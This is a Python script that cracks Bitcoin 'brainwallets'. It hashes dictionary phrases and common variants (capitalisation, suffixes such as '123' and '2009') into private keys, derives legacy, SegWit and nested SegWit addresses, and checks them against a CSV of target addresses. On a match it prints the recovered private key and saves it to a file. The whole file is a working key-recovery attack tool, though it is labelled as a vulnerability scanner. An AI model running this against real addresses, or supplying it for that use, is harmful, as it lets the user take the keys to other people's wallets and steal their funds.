import hashlib
import ecdsa
import base58
import pandas as pd
import os

# --- Simple Bech32 Implementation ---
CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l"
def bech32_polymod(values):
    generator = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3]
    chk = 1
    for value in values:
        top = chk >> 25
        chk = (chk & 0x1ffffff) << 5 ^ value
        for i in range(5):
            chk ^= generator[i] if ((top >> i) & 1) else 0
    return chk
def bech32_hrp_expand(hrp):
    return [ord(x) >> 5 for x in hrp] + [0] + [ord(x) & 31 for x in hrp]
def bech32_create_checksum(hrp, data):
    values = bech32_hrp_expand(hrp) + data
    polymod = bech32_polymod(values + [0, 0, 0, 0, 0, 0]) ^ 1
    return [(polymod >> 5 * (5 - i)) & 31 for i in range(6)]
def bech32_encode(hrp, data):
    combined = data + bech32_create_checksum(hrp, data)
    return hrp + '1' + ''.join([CHARSET[d] for d in combined])
def convertbits(data, frombits, tobits, pad=True):
    acc, bits, ret = 0, 0, []
    maxv = (1 << tobits) - 1
    max_acc = (1 << (frombits + tobits - 1)) - 1
    for value in data:
        if value < 0 or (value >> frombits): return None
        acc = ((acc << frombits) | value) & max_acc
        bits += frombits
        while bits >= tobits:
            bits -= tobits
            ret.append((acc >> bits) & maxv)
    if pad:
        if bits: ret.append((acc << (tobits - bits)) & maxv)
    elif bits >= frombits or ((acc << (tobits - bits)) & maxv): return None
    return ret
# --- End of Bech32 ---

def pubkey_to_address(pubkey_bytes):
    sha256_pub = hashlib.sha256(pubkey_bytes).digest()
    ripemd160 = hashlib.new('ripemd160', sha256_pub).digest()
    vh = b'\x00' + ripemd160
    checksum = hashlib.sha256(hashlib.sha256(vh).digest()).digest()[:4]
    return base58.b58encode(vh + checksum).decode('utf-8')

def pubkey_to_segwit_address(pubkey_bytes):
    sha256_pub = hashlib.sha256(pubkey_bytes).digest()
    ripemd160 = hashlib.new('ripemd160', sha256_pub).digest()
    converted = convertbits(ripemd160, 8, 5)
    return bech32_encode('bc', [0] + converted)

def pubkey_to_p2sh_p2wpkh_address(pubkey_bytes):
    sha256_pub = hashlib.sha256(pubkey_bytes).digest()
    ripemd160 = hashlib.new('ripemd160', sha256_pub).digest()
    redeem_script = b'\x00\x14' + ripemd160
    sha256_redeem = hashlib.sha256(redeem_script).digest()
    ripemd160_redeem = hashlib.new('ripemd160', sha256_redeem).digest()
    vh = b'\x05' + ripemd160_redeem
    checksum = hashlib.sha256(hashlib.sha256(vh).digest()).digest()[:4]
    return base58.b58encode(vh + checksum).decode('utf-8')

# Bitcoin address generation helper
def phrase_to_addresses(phrase):
    private_key_bytes = hashlib.sha256(phrase.encode('utf-8')).digest()
    sk = ecdsa.SigningKey.from_string(private_key_bytes, curve=ecdsa.SECP256k1)
    vk = sk.get_verifying_key()
    
    uncompressed_pub = b'\x04' + vk.to_string()
    
    # Compressed pubkey
    x_str = vk.to_string()[:32]
    y_last_byte = vk.to_string()[-1]
    if y_last_byte % 2 == 0:
        compressed_pub = b'\x02' + x_str
    else:
        compressed_pub = b'\x03' + x_str
        
    results = [
        (pubkey_to_address(uncompressed_pub), 'Legacy Uncompressed'),
        (pubkey_to_address(compressed_pub), 'Legacy Compressed'),
        (pubkey_to_segwit_address(compressed_pub), 'Native SegWit (bech32)'),
        (pubkey_to_p2sh_p2wpkh_address(compressed_pub), 'Nested SegWit (P2SH)')
    ]
    return results, private_key_bytes.hex()

def get_permutations(phrase):
    perms = {phrase, phrase.lower(), phrase.capitalize(), phrase.upper()}
    # Add common suffixes
    suffixes = ["123", "!", "2009", "2024", "1"]
    base_perms = list(perms)
    for p in base_perms:
        for s in suffixes:
            perms.add(p + s)
    return perms

def run_scanner():
    if not os.path.exists("master_address_tracking.csv"):
        print("Missing master_address_tracking.csv.")
        return

    df = pd.read_csv("master_address_tracking.csv")
    target_addresses = set(df['Address'].tolist())
    
    dict_file = "extended_dictionary.txt"
    if not os.path.exists(dict_file):
        dict_file = "dictionary.txt"
    
    if not os.path.exists(dict_file):
        print(f"Missing dictionary files. Using small internal list.")
        base_phrases = ["satoshi nakamoto", "bitcoin", "blockchain"]
    else:
        with open(dict_file, "r") as f:
            base_phrases = [line.strip() for line in f if line.strip() and not line.startswith("#")]

    print(f"Scanning {len(base_phrases)} phrases across 4 address types against {len(target_addresses)} targets...")
    
    found = False
    total_checked = 0
    for base in base_phrases:
        phrases = get_permutations(base)
        for phrase in phrases:
            addrs_info, priv_hex = phrase_to_addresses(phrase)
            for addr, addr_type in addrs_info:
                total_checked += 1
                if addr in target_addresses:
                    print(f"\n!!! MATCH FOUND ({addr_type}) !!!")
                    print(f"Phrase: {phrase}")
                    print(f"Address: {addr}")
                    print(f"Private Key (Hex): {priv_hex}")
                    with open("vulnerabilities_found.txt", "a") as vf:
                        vf.write(f"Brainwallet Found! ({addr_type})\nPhrase: {phrase}\nAddress: {addr}\nPK: {priv_hex}\n\n")
                    found = True
    
    print(f"\nScan complete. Tested {total_checked} address variations.")
    if not found:
        print("No matches found.")

if __name__ == "__main__":
    run_scanner()
